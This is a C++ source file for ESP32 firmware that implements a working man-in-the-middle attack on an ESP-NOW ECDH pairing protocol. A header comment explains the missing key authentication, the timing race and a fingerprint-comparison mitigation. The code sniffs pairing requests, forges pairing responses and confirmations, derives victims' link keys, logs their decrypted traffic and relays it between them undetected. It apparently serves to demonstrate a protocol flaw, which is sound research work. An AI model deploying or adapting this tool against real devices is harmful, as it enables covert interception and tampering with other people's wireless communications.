/*
 * mitm.cpp
 *
 * Man-in-the-Middle attack on the ESP-NOW ECDH pairing handshake.
 *
 * ── Root cause of the vulnerability ─────────────────────────────────────────
 * The pairing protocol uses ECDH (P-256) to establish a shared secret, which
 * is secure against passive eavesdroppers: an observer who captures both public
 * keys still cannot compute the shared secret without one of the private keys.
 *
 * However, the protocol provides NO AUTHENTICATION of the public keys.  Device A
 * accepts the first PAIRING_RESPONSE it receives without verifying that it came
 * from the specific device it intended to pair with.  An adversary in radio
 * range can intercept the unencrypted broadcast, substitute its own public key,
 * and cause the victim to establish an encrypted session with the adversary
 * rather than with its intended peer.
 *
 * ── Attack flow (per victim device V) ────────────────────────────────────────
 *  1. V broadcasts PAIRING_REQUEST containing V's ephemeral public key (pub_V).
 *  2. Adversary generates its own ephemeral key pair (priv_n, pub_n).
 *  3. Adversary immediately sends PAIRING_RESPONSE to V containing pub_n.
 *     (V accepts the first response it receives; if the adversary is faster
 *      than V's intended peer, V pairs with the adversary.)
 *  4. Both sides perform ECDH:
 *       V:          shared_V = ECDH(V_priv,   pub_n)
 *       Adversary:  shared_A = ECDH(priv_n,   pub_V)
 *     By ECDH correctness, shared_V == shared_A.
 *  5. Both derive the same LMK from the shared secret via SHA-256.
 *  6. V registers the adversary's MAC as its encrypted peer (using lmk_V).
 *     Adversary registers V's MAC as an encrypted peer (using lmk_V).
 *  7. Adversary sends PAIRING_CONFIRM — V logs "Pairing confirmed by peer" and
 *     considers the session established.
 *  Result: V believes it is paired with its intended device.  In reality, all
 *  of V's encrypted traffic goes to and from the adversary.
 *
 * ── Relay (transparent interception) ─────────────────────────────────────────
 * Once the adversary holds LMKs for two victims A and B:
 *   - A sends encrypted DATA to adversary's MAC → ESP32 hardware decrypts
 *     using lmk_A → recv callback receives plaintext.
 *   - Adversary logs the plaintext, then calls esp_now_send(B_mac, data, len).
 *   - ESP32 hardware re-encrypts using lmk_B → B receives the frame and
 *     decrypts it normally.
 * From A's and B's perspectives the communication appears normal.  The
 * adversary reads (and could modify) every frame without either side knowing.
 *
 * ── Why the timing advantage matters ─────────────────────────────────────────
 * The victim's pairing code (pairing.cpp) accepts the FIRST PAIRING_RESPONSE
 * it receives (state PAIRING_WAIT_RESPONSE → finalize immediately on first
 * response).  The adversary, which has no legitimate work to do before
 * responding, will typically reply within one 802.11 frame time (~1–2 ms)
 * while the legitimate peer must first be triggered by a user typing "pair"
 * and run its own key generation (~10–50 ms on an ESP32).  The adversary wins
 * the race in most practical scenarios.
 *
 * ── Proposed mitigation ───────────────────────────────────────────────────────
 * After key exchange, each device should display the hex fingerprint of the
 * derived shared secret (or of both public keys concatenated) on its serial
 * terminal.  The user physically compares the two displays and confirms they
 * match before the pairing is accepted (analogous to Bluetooth "Numeric
 * Comparison" pairing, BT spec Vol 3 Part H §2.3.5.6).  An adversary cannot
 * force both sides to display the same fingerprint without knowing one of the
 * private keys.
 */

#include "mitm.h"
#include "crypto.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_now.h>
#include <string.h>

// ── Module state ──────────────────────────────────────────────────────────────

static uint8_t   s_own_mac[6];
static victim_t  s_victims[MAX_VICTIMS];
static int       s_victim_count = 0;
static bool      s_attack  = false;
static bool      s_relay   = false;

static const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/*
 * ADV_PMK — the adversary's fixed Primary Master Key.
 *
 * The ESP32 ESP-NOW stack requires a global PMK that protects LMK storage.
 * The pairing firmware derives its PMK from the ECDH shared secret, so each
 * legitimate pairing session uses a different PMK.  If the adversary also
 * changed its PMK per session, each new call to esp_now_set_pmk() would
 * invalidate the LMKs of all previously registered peers (the hardware stores
 * LMKs encrypted under the PMK).
 *
 * By using a single fixed adversary PMK, all victim LMKs stay valid
 * indefinitely regardless of how many MITM sessions are active.  The victims'
 * own PMKs are irrelevant to the adversary — only the LMK (which the adversary
 * derives correctly from ECDH) matters for frame encryption/decryption.
 */
static const uint8_t ADV_PMK[16] = {
    0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD,
    0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD, 0xAD
};

// ── Internal helpers ──────────────────────────────────────────────────────────

static void print_mac(const uint8_t mac[6]) {
    Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void print_pubkey_short(const uint8_t pub[ECDH_PUBKEY_LEN]) {
    // Print first 8 bytes of the public key as a short fingerprint.
    for (int i = 0; i < 8; i++) Serial.printf("%02X", pub[i]);
    Serial.print("...");
}

// Find an existing victim entry by MAC, or allocate a new slot.
// Returns nullptr if the table is full.
static victim_t *find_or_add_victim(const uint8_t mac[6]) {
    for (int i = 0; i < s_victim_count; i++) {
        if (memcmp(s_victims[i].mac, mac, 6) == 0) return &s_victims[i];
    }
    if (s_victim_count >= MAX_VICTIMS) return nullptr;
    victim_t *v = &s_victims[s_victim_count++];
    memset(v, 0, sizeof(victim_t));
    memcpy(v->mac, mac, 6);
    return v;
}

// Register dest_mac as an unencrypted ESP-NOW peer if it isn't already known,
// then send raw (unencrypted) bytes.  Used during the pairing handshake before
// keys are established.
static bool send_raw(const uint8_t dest_mac[6], const uint8_t *data, size_t len) {
    if (!esp_now_is_peer_exist(dest_mac)) {
        esp_now_peer_info_t peer = {};
        memcpy(peer.peer_addr, dest_mac, 6);
        peer.channel = ESPNOW_CHANNEL;
        peer.ifidx   = WIFI_IF_STA;
        peer.encrypt = false;
        esp_now_add_peer(&peer);
    }
    return esp_now_send(dest_mac, data, len) == ESP_OK;
}

// Register a victim as an encrypted ESP-NOW peer using the derived LMK.
// If the MAC is already in the peer table (e.g., from a prior unencrypted
// send_raw call) it is replaced with the encrypted entry.
static bool register_victim_peer(const uint8_t mac[6], const uint8_t lmk[16]) {
    if (esp_now_is_peer_exist(mac)) {
        esp_now_del_peer(mac);
    }
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, mac, 6);
    peer.channel = ESPNOW_CHANNEL;
    peer.ifidx   = WIFI_IF_STA;
    peer.encrypt = true;
    memcpy(peer.lmk, lmk, 16);
    return esp_now_add_peer(&peer) == ESP_OK;
}

// ── ESP-NOW callbacks ─────────────────────────────────────────────────────────

static void on_send(const uint8_t *mac, esp_now_send_status_t status) {
    if (status != ESP_NOW_SEND_SUCCESS) {
        Serial.printf("[adv] send to ");
        print_mac(mac);
        Serial.println(" failed");
    }
}

// on_recv is registered as the ESP-NOW receive callback and routes all
// incoming frames to mitm_on_recv().
static void on_recv(const esp_now_recv_info_t *info, const uint8_t *data, int len) {
    mitm_on_recv(info->src_addr, data, (size_t)len);
}

// ── Public API ────────────────────────────────────────────────────────────────

void mitm_init() {
    // Cache own MAC for embedding in forged response packets.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    WiFi.macAddress(s_own_mac);

    if (esp_now_init() != ESP_OK) {
        Serial.println("[adv] ESP-NOW init failed — halting");
        while (1) delay(1000);
    }

    esp_now_register_recv_cb(on_recv);
    esp_now_register_send_cb(on_send);

    // Set the adversary's fixed PMK once.  It is never changed again so that
    // the LMKs of all registered victims remain valid across multiple sessions.
    esp_now_set_pmk(ADV_PMK);

    Serial.print("[adv] Own MAC: ");
    print_mac(s_own_mac);
    Serial.println();
    Serial.println("[adv] Listening for pairing broadcasts...");
}

void mitm_set_attack(bool enabled) {
    s_attack = enabled;
    Serial.printf("[adv] Attack mode %s\n", enabled ? "ENABLED" : "disabled");
}

void mitm_set_relay(bool enabled) {
    s_relay = enabled;
    Serial.printf("[adv] Relay mode %s\n", enabled ? "ENABLED" : "disabled");
}

bool mitm_get_attack() { return s_attack; }
bool mitm_get_relay()  { return s_relay;  }

// ── Core receive handler / attack state machine ───────────────────────────────

void mitm_on_recv(const uint8_t *src_mac, const uint8_t *data, size_t len) {
    if (len < ESPNOW_PACKET_SIZE) return;
    const espnow_packet_t *pkt = (const espnow_packet_t *)data;

    switch (pkt->type) {

        // ── PAIRING_REQUEST ───────────────────────────────────────────────────
        case PKT_PAIRING_REQUEST: {
            /*
             * A device has broadcast its ephemeral ECDH public key, signalling
             * that it wants to pair.  This frame is sent to FF:FF:FF:FF:FF:FF
             * so every device in range receives it — including us.
             *
             * In passive (sniff-only) mode we just log the observation.
             * In attack mode we intercept the handshake.
             */

            Serial.print("[sniff] PAIRING_REQUEST from ");
            print_mac(pkt->mac);
            Serial.print("  pub_key: ");
            print_pubkey_short(pkt->payload);
            Serial.println();

            if (!s_attack) break; // passive mode — do not respond

            // Skip devices we have already MITM'd.
            victim_t *v = find_or_add_victim(pkt->mac);
            if (!v) {
                Serial.println("[adv] Victim table full — not intercepting");
                break;
            }
            if (v->active) break;

            Serial.print("[adv] INTERCEPTING pairing from ");
            print_mac(pkt->mac);
            Serial.println();

            /*
             * Step 1: Generate our own ephemeral key pair for this session.
             * The private key is stored internally in the crypto module; it is
             * only needed until we call crypto_compute_shared_secret() below.
             */
            uint8_t our_pub[ECDH_PUBKEY_LEN];
            if (!crypto_generate_keypair(our_pub)) {
                Serial.println("[adv] Keypair generation failed");
                s_victim_count--; // remove the slot we just allocated
                break;
            }

            /*
             * Step 2: Send a forged PAIRING_RESPONSE back to the victim.
             * We embed our own MAC and our freshly generated public key.
             * The victim will accept this as a legitimate response and compute
             * ECDH(victim_priv, our_pub) — which equals our own ECDH result
             * by construction.
             */
            espnow_packet_t resp = {};
            resp.type = PKT_PAIRING_RESPONSE;
            memcpy(resp.mac, s_own_mac, 6);
            resp.payload_len = ECDH_PUBKEY_LEN;
            memcpy(resp.payload, our_pub, ECDH_PUBKEY_LEN);
            send_raw(src_mac, (uint8_t *)&resp, ESPNOW_PACKET_SIZE);

            /*
             * Step 3: Compute the shared secret.
             * pkt->payload is the victim's public key (received in plain text).
             * We multiply it by our private key to get the same shared secret
             * the victim will compute using our public key.
             */
            uint8_t secret[32];
            if (!crypto_compute_shared_secret(pkt->payload, secret)) {
                Serial.println("[adv] Shared secret computation failed");
                s_victim_count--;
                break;
            }

            /*
             * Step 4: Derive the LMK.
             * We discard the ECDH-derived PMK and use our fixed ADV_PMK instead
             * (see the ADV_PMK comment above for why).  The LMK is what actually
             * encrypts/decrypts frames, and it must match between adversary and
             * victim — it does, because both sides ran the same ECDH + SHA-256.
             */
            uint8_t derived_pmk[16]; // computed but not used
            crypto_derive_keys(secret, derived_pmk, v->lmk);

            /*
             * Step 5: Register the victim as an encrypted peer.
             * From this point on the ESP32 hardware automatically decrypts
             * incoming frames from this victim and encrypts outgoing frames.
             */
            if (!register_victim_peer(v->mac, v->lmk)) {
                Serial.println("[adv] Failed to register victim peer");
                s_victim_count--;
                break;
            }
            v->active = true;

            /*
             * Step 6: Send a forged PAIRING_CONFIRM.
             * The victim's firmware transitions to PAIRING_COMPLETE when it
             * receives this, printing "Pairing confirmed by peer" — it has no
             * indication that anything went wrong.
             */
            espnow_packet_t confirm = {};
            confirm.type = PKT_PAIRING_CONFIRM;
            memcpy(confirm.mac, s_own_mac, 6);
            confirm.payload_len = 0;
            send_raw(src_mac, (uint8_t *)&confirm, ESPNOW_PACKET_SIZE);

            Serial.print("[adv] MITM complete — victim ");
            print_mac(v->mac);
            Serial.println(" now paired with adversary");
            Serial.printf("[adv] Total victims: %d\n", s_victim_count);

            if (s_victim_count >= 2) {
                Serial.println("[adv] Two victims intercepted — relay is ready (use 'relay on')");
            }
            break;
        }

        // ── PAIRING_RESPONSE ──────────────────────────────────────────────────
        case PKT_PAIRING_RESPONSE: {
            /*
             * A device is responding to a pairing request.  In a legitimate
             * session this goes directly from the responder to the initiator;
             * we may see it if we sent a forged PAIRING_REQUEST to lure a
             * responder, or simply because we are passively sniffing.
             */
            Serial.print("[sniff] PAIRING_RESPONSE from ");
            print_mac(pkt->mac);
            Serial.print("  pub_key: ");
            print_pubkey_short(pkt->payload);
            Serial.println();
            break;
        }

        // ── PAIRING_CONFIRM ───────────────────────────────────────────────────
        case PKT_PAIRING_CONFIRM: {
            Serial.print("[sniff] PAIRING_CONFIRM from ");
            print_mac(pkt->mac);
            Serial.println();
            break;
        }

        // ── DATA ──────────────────────────────────────────────────────────────
        case PKT_DATA: {
            /*
             * An encrypted data frame arrived.  Because the victim is a
             * registered encrypted peer, the ESP-NOW hardware has already
             * decrypted the frame before this callback fires.  We see the
             * plaintext payload with no additional effort.
             *
             * If relay mode is active, forward the frame to all OTHER paired
             * victims.  The hardware re-encrypts using each recipient's LMK,
             * so the recipients see normally encrypted traffic.
             */
            Serial.print("[intercept] DATA from ");
            print_mac(src_mac);
            Serial.printf(" (%d bytes): %.*s\n",
                          pkt->payload_len,
                          (int)pkt->payload_len,
                          pkt->payload);

            if (s_relay) {
                // Forward to every OTHER active victim.
                for (int i = 0; i < s_victim_count; i++) {
                    if (!s_victims[i].active) continue;
                    if (memcmp(s_victims[i].mac, src_mac, 6) == 0) continue;

                    esp_now_send(s_victims[i].mac, data, len);

                    Serial.print("[relay] Forwarded to ");
                    print_mac(s_victims[i].mac);
                    Serial.println();
                }
            }
            break;
        }

        default:
            break;
    }
}

void mitm_print_status() {
    Serial.println("── Adversary Status ──────────────────────────");
    Serial.print  ("   Own MAC   : "); print_mac(s_own_mac); Serial.println();
    Serial.printf ("   Attack    : %s\n", s_attack ? "ENABLED"  : "disabled");
    Serial.printf ("   Relay     : %s\n", s_relay  ? "ENABLED"  : "disabled");
    Serial.printf ("   Victims   : %d / %d\n", s_victim_count, MAX_VICTIMS);
    for (int i = 0; i < s_victim_count; i++) {
        victim_t *v = &s_victims[i];
        Serial.printf("   [%d] MAC: ", i);
        print_mac(v->mac);
        Serial.printf("  LMK: %02X%02X%02X%02X...  %s\n",
                      v->lmk[0], v->lmk[1], v->lmk[2], v->lmk[3],
                      v->active ? "ACTIVE" : "pending");
    }
    Serial.println("─────────────────────────────────────────────");
}
